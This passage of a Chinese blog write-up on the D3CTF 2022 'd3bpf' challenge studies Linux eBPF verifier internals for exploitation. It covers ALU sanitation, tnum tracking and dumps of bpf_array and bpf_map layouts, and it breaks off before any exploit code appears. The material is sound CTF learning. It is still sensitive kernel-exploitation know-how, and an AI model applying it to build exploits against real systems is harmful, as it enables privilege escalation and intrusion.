<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="7r1p13J">





<title>ebpf初探 | Hexo</title>



    <link rel="icon" href="/github-11-48.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">ebpf初探</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">November 20, 2022&nbsp;&nbsp;10:28:05</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/kernel-CTF/">kernel && CTF</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="ebpf初探"><a href="#ebpf初探" class="headerlink" title="ebpf初探"></a>ebpf初探</h1><blockquote>
<p>D3ctf2022 - d3bpf</p>
<p>主要是通过<a target="_blank" rel="noopener" href="https://stdnoerr.github.io/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html">stdnoerr.</a> 的exp进行ebpf的学习，这位作者的利用手法 相比出题人的利用方法更为巧妙，也更为简单。</p>
</blockquote>
<h3 id="ALU-Sanitation"><a href="#ALU-Sanitation" class="headerlink" title="ALU Sanitation"></a>ALU Sanitation</h3><p>对于涉及指针和标量寄存器的每个算术运算，都会计算一个<strong>alu_limit</strong>。这表示可以从指针中添加或减去的最大绝对值。在这些操作中的每一个之前，字节码都使用以下指令进行修补：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*patch++ = BPF_MOV32_IMM(BPF_REG_AX, aux-&gt;alu_limit);</span><br><span class="line">*patch++ = BPF_ALU64_REG(BPF_SUB, BPF_REG_AX, off_reg);</span><br><span class="line">*patch++ = BPF_ALU64_REG(BPF_OR, BPF_REG_AX, off_reg);</span><br><span class="line">*patch++ = BPF_ALU64_IMM(BPF_NEG, BPF_REG_AX, <span class="number">0</span>);</span><br><span class="line">*patch++ = BPF_ALU64_IMM(BPF_ARSH, BPF_REG_AX, <span class="number">63</span>);<span class="comment">//如果是负数，算数右移63即全部位为1</span></span><br><span class="line">												  <span class="comment">// 如果是正数，算数右移63即全部位为0</span></span><br><span class="line">*patch++ = BPF_ALU64_REG(BPF_AND, BPF_REG_AX, off_reg);</span><br></pre></td></tr></table></figure>

<p>通过减法和或来判断符号位，以此来判断off_reg于alu_limt大小，如果off_reg &gt; alu_limit ，或者 off_reg 与 alu_limit 符号相反，off_reg 将被替换成0 (与0进行and运算)，使得此次指针运算无效，否则的话不变。</p>
<h3 id="tnum-struct"><a href="#tnum-struct" class="headerlink" title="tnum struct"></a>tnum struct</h3><p>这里引用了@becase 师傅的注释</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ------------------------------------------------</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="comment">/* valid when type == PTR_TO_PACKET */</span></span><br><span class="line">        u16 range;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">         *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line"></span><br><span class="line">        u32 btf_id; <span class="comment">/* for PTR_TO_BTF_ID */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Max size from any of the above. */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> raw;</span><br><span class="line">    &#125;;</span><br><span class="line">    s32 off;</span><br><span class="line">    u32 id;</span><br><span class="line">    u32 ref_obj_id;</span><br><span class="line">    <span class="comment">/* For scalar types (SCALAR_VALUE), this represents our knowledge of</span></span><br><span class="line"><span class="comment">     * the actual value.</span></span><br><span class="line"><span class="comment">     * For pointer types, this represents the variable part of the offset</span></span><br><span class="line"><span class="comment">     * from the pointed-to object, and is shared with all bpf_reg_states</span></span><br><span class="line"><span class="comment">     * with the same id as us.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span>  <span class="comment">// tnum结构体详见以下!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">    <span class="comment">/* Used to determine if any memory access using this register will</span></span><br><span class="line"><span class="comment">     * result in a bad access.</span></span><br><span class="line"><span class="comment">     * These refer to the same value as var_off, not necessarily the actual</span></span><br><span class="line"><span class="comment">     * contents of the register.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    s64 smin_value; <span class="comment">// 有符号时可能的最小值</span></span><br><span class="line">    s64 smax_value; <span class="comment">// 有符号时可能的最大值</span></span><br><span class="line">    u64 umin_value; <span class="comment">// 无符号时可能的最小值</span></span><br><span class="line">    u64 umax_value; <span class="comment">// 无符号时可能的最大值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">    u32 frameno;</span><br><span class="line">    s32 subreg_def;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_liveness</span> <span class="title">live</span>;</span></span><br><span class="line">    <span class="comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span></span><br><span class="line">    <span class="type">bool</span> precise;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ------------------------------------------------</span></span><br><span class="line"><span class="comment">/* tnum: tracked (or tristate) numbers</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A tnum tracks knowledge about the bits of a value.  Each bit can be either</span></span><br><span class="line"><span class="comment"> * known (0 or 1), or unknown (x).  Arithmetic operations on tnums will</span></span><br><span class="line"><span class="comment"> * propagate the unknown bits such that the tnum result represents all the</span></span><br><span class="line"><span class="comment"> * possible results for possible values of the operands.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">    u64 value; 		<span class="comment">// value: 某个bit为1 表示这个寄存器的这个bit 确定是1</span></span><br><span class="line">    u64 mask;		<span class="comment">// mask: 某个bit 为1表示这个 bit 是未知的</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>掩码中设置的每一位都意味着该位的值是未知的<strong>。</strong>  未设置的位是已知的，它们的真实值存储在 value 中。例如，如果**var_off &#x3D; {mask &#x3D; 0x0; value &#x3D; 0x1}<strong>，寄存器的所有位都是已知的，并且已知寄存器的值为 1。如果</strong>var_off &#x3D; {mask &#x3D; 0xFFFFFFFF00000000; value &#x3D; 0x3}**表示寄存器的低 32 位已知为 0x00000003，高 32 位未知。</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221117224325111.png" alt="image-20221117224325111"></p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221117231533062.png" alt="image-20221117231533062"></p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221117231550215.png" alt="image-20221117231550215"></p>
<p>还有一个值得一提的是，我一度以为bpf_array 中的value 直接就是占用结构体空间的数组了，结果调试的时候才发现这是个指针来着的( 这导致了我一直没能理解exp是怎么实现任意写的</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221118223748297.png" alt="image-20221118223748297"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">❯ pahole -C bpf_array vmlinux</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_array</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span>             <span class="title">map</span>;</span>                  <span class="comment">/*     0   256 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* XXX last struct has 40 bytes of padding */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* --- cacheline 4 boundary (256 bytes) --- */</span></span><br><span class="line">        u32                        elem_size;            <span class="comment">/*   256     4 */</span></span><br><span class="line">        u32                        index_mask;           <span class="comment">/*   260     4 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_array_aux</span> *     <span class="title">aux</span>;</span>                  <span class="comment">/*   264     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">char</span>               value[<span class="number">0</span>];             <span class="comment">/*   272     0 */</span></span><br><span class="line">                <span class="type">void</span> *             ptrs[<span class="number">0</span>];              <span class="comment">/*   272     0 */</span></span><br><span class="line">                <span class="type">void</span> *             pptrs[<span class="number">0</span>];             <span class="comment">/*   272     0 */</span></span><br><span class="line">        &#125;;                                               <span class="comment">/*   272     0 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* size: 320, cachelines: 5, members: 5 */</span></span><br><span class="line">        <span class="comment">/* padding: 48 */</span></span><br><span class="line">        <span class="comment">/* paddings: 1, sum paddings: 40 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">❯ pahole -C bpf_map vmlinux</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> &#123;</span></span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span>  * <span class="title">ops</span>;</span>                 <span class="comment">/*     0     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *           <span class="title">inner_map_meta</span>;</span>       <span class="comment">/*     8     8 */</span></span><br><span class="line">        <span class="type">void</span> *                     security;             <span class="comment">/*    16     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">enum</span> <span class="title">bpf_map_type</span>          <span class="title">map_type</span>;</span>             <span class="comment">/*    24     4 */</span></span><br><span class="line">        u32                        key_size;             <span class="comment">/*    28     4 */</span></span><br><span class="line">        u32                        value_size;           <span class="comment">/*    32     4 */</span></span><br><span class="line">        u32                        max_entries;          <span class="comment">/*    36     4 */</span></span><br><span class="line">        u32                        map_flags;            <span class="comment">/*    40     4 */</span></span><br><span class="line">        <span class="type">int</span>                        spin_lock_off;        <span class="comment">/*    44     4 */</span></span><br><span class="line">        u32                        id;                   <span class="comment">/*    48     4 */</span></span><br><span class="line">        <span class="type">int</span>                        numa_node;            <span class="comment">/*    52     4 */</span></span><br><span class="line">        u32                        btf_key_type_id;      <span class="comment">/*    56     4 */</span></span><br><span class="line">        u32                        btf_value_type_id;    <span class="comment">/*    60     4 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *               <span class="title">btf</span>;</span>                  <span class="comment">/*    64     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *        <span class="title">memcg</span>;</span>                <span class="comment">/*    72     8 */</span></span><br><span class="line">        <span class="type">char</span>                       name[<span class="number">16</span>];             <span class="comment">/*    80    16 */</span></span><br><span class="line">        u32                        btf_vmlinux_value_type_id; <span class="comment">/*    96     4 */</span></span><br><span class="line">        <span class="type">bool</span>                       bypass_spec_v1;       <span class="comment">/*   100     1 */</span></span><br><span class="line">        <span class="type">bool</span>                       frozen;               <span class="comment">/*   101     1 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* XXX 26 bytes hole, try to pack */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">        <span class="type">atomic64_t</span>                 refcnt;               <span class="comment">/*   128     8 */</span></span><br><span class="line">        <span class="type">atomic64_t</span>                 usercnt;              <span class="comment">/*   136     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span>         <span class="title">work</span>;</span>                 <span class="comment">/*   144    32 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>               <span class="title">freeze_mutex</span>;</span>         <span class="comment">/*   176    32 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 3 boundary (192 bytes) was 16 bytes ago --- */</span></span><br><span class="line">        u64                        writecnt;             <span class="comment">/*   208     8 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* size: 256, cachelines: 4, members: 24 */</span></span><br><span class="line">        <span class="comment">/* sum members: 190, holes: 1, sum holes: 26 */</span></span><br><span class="line">        <span class="comment">/* padding: 40 */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">❯ pahole -C bpf_map_ops vmlinux</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> &#123;</span></span><br><span class="line">        <span class="type">int</span>                        (*map_alloc_check)(<span class="keyword">union</span> bpf_attr *); <span class="comment">/*     0     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *           (*<span class="title">map_alloc</span>)(<span class="title">union</span> <span class="title">bpf_attr</span> *);</span> <span class="comment">/*     8     8 */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_release)(<span class="keyword">struct</span> bpf_map *, <span class="keyword">struct</span> file *); <span class="comment">/*    16     8 */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_free)(<span class="keyword">struct</span> bpf_map *); <span class="comment">/*    24     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_get_next_key)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *, <span class="type">void</span> *); <span class="comment">/*    32     8 */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_release_uref)(<span class="keyword">struct</span> bpf_map *); <span class="comment">/*    40     8 */</span></span><br><span class="line">        <span class="type">void</span> *                     (*map_lookup_elem_sys_only)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *); <span class="comment">/*    48     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_lookup_batch)(<span class="keyword">struct</span> bpf_map *, <span class="type">const</span> <span class="keyword">union</span> bpf_attr  *, <span class="keyword">union</span> bpf_attr *); <span class="comment">/*    56     8 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_lookup_and_delete_batch)(<span class="keyword">struct</span> bpf_map *, <span class="type">const</span> <span class="keyword">union</span> bpf_attr  *, <span class="keyword">union</span> bpf_attr *); <span class="comment">/*    64     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_update_batch)(<span class="keyword">struct</span> bpf_map *, <span class="type">const</span> <span class="keyword">union</span> bpf_attr  *, <span class="keyword">union</span> bpf_attr *); <span class="comment">/*    72     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_delete_batch)(<span class="keyword">struct</span> bpf_map *, <span class="type">const</span> <span class="keyword">union</span> bpf_attr  *, <span class="keyword">union</span> bpf_attr *); <span class="comment">/*    80     8 */</span></span><br><span class="line">        <span class="type">void</span> *                     (*map_lookup_elem)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *); <span class="comment">/*    88     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_update_elem)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *, <span class="type">void</span> *, u64); <span class="comment">/*    96     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_delete_elem)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *); <span class="comment">/*   104     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_push_elem)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *, u64); <span class="comment">/*   112     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_pop_elem)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *); <span class="comment">/*   120     8 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 2 boundary (128 bytes) --- */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_peek_elem)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *); <span class="comment">/*   128     8 */</span></span><br><span class="line">        <span class="type">void</span> *                     (*map_fd_get_ptr)(<span class="keyword">struct</span> bpf_map *, <span class="keyword">struct</span> file *, <span class="type">int</span>); <span class="comment">/*   136     8 */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_fd_put_ptr)(<span class="type">void</span> *); <span class="comment">/*   144     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_gen_lookup)(<span class="keyword">struct</span> bpf_map *, <span class="keyword">struct</span> bpf_insn *); <span class="comment">/*   152     8 */</span></span><br><span class="line">        u32                        (*map_fd_sys_lookup_elem)(<span class="type">void</span> *); <span class="comment">/*   160     8 */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_seq_show_elem)(<span class="keyword">struct</span> bpf_map *, <span class="type">void</span> *, <span class="keyword">struct</span> seq_file *); <span class="comment">/*   168     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_check_btf)(<span class="type">const</span> <span class="keyword">struct</span> bpf_map  *, <span class="type">const</span> <span class="keyword">struct</span> btf  *, <span class="type">const</span> <span class="keyword">struct</span> btf_type  *, <span class="type">const</span> <span class="keyword">struct</span> btf_type  *); <span class="comment">/*   176     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_poke_track)(<span class="keyword">struct</span> bpf_map *, <span class="keyword">struct</span> bpf_prog_aux *); <span class="comment">/*   184     8 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_poke_untrack)(<span class="keyword">struct</span> bpf_map *, <span class="keyword">struct</span> bpf_prog_aux *); <span class="comment">/*   192     8 */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_poke_run)(<span class="keyword">struct</span> bpf_map *, u32, <span class="keyword">struct</span> bpf_prog *, <span class="keyword">struct</span> bpf_prog *); <span class="comment">/*   200     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_direct_value_addr)(<span class="type">const</span> <span class="keyword">struct</span> bpf_map  *, u64 *, u32); <span class="comment">/*   208     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_direct_value_meta)(<span class="type">const</span> <span class="keyword">struct</span> bpf_map  *, u64, u32 *); <span class="comment">/*   216     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_mmap)(<span class="keyword">struct</span> bpf_map *, <span class="keyword">struct</span> vm_area_struct *); <span class="comment">/*   224     8 */</span></span><br><span class="line">        <span class="type">__poll_t</span>                   (*map_poll)(<span class="keyword">struct</span> bpf_map *, <span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *); <span class="comment">/*   232     8 */</span></span><br><span class="line">        <span class="type">int</span>                        (*map_local_storage_charge)(<span class="keyword">struct</span> bpf_local_storage_map *, <span class="type">void</span> *, u32); <span class="comment">/*   240     8 */</span></span><br><span class="line">        <span class="type">void</span>                       (*map_local_storage_uncharge)(<span class="keyword">struct</span> bpf_local_storage_map *, <span class="type">void</span> *, u32); <span class="comment">/*   248     8 */</span></span><br><span class="line">        <span class="comment">/* --- cacheline 4 boundary (256 bytes) --- */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_local_storage</span> * * (*<span class="title">map_owner_storage_ptr</span>)(<span class="title">void</span> *);</span> <span class="comment">/*   256     8 */</span></span><br><span class="line">        <span class="type">bool</span>                       (*map_meta_equal)(<span class="type">const</span> <span class="keyword">struct</span> bpf_map  *, <span class="type">const</span> <span class="keyword">struct</span> bpf_map  *); <span class="comment">/*   264     8 */</span></span><br><span class="line">        <span class="type">const</span> <span class="type">const</span> <span class="type">char</span>  *        map_btf_name;         <span class="comment">/*   272     8 */</span></span><br><span class="line">        <span class="type">int</span> *                      map_btf_id;           <span class="comment">/*   280     8 */</span></span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_iter_seq_info</span>  * <span class="title">iter_seq_info</span>;</span> <span class="comment">/*   288     8 */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* size: 296, cachelines: 5, members: 37 */</span></span><br><span class="line">        <span class="comment">/* last cacheline: 40 bytes */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 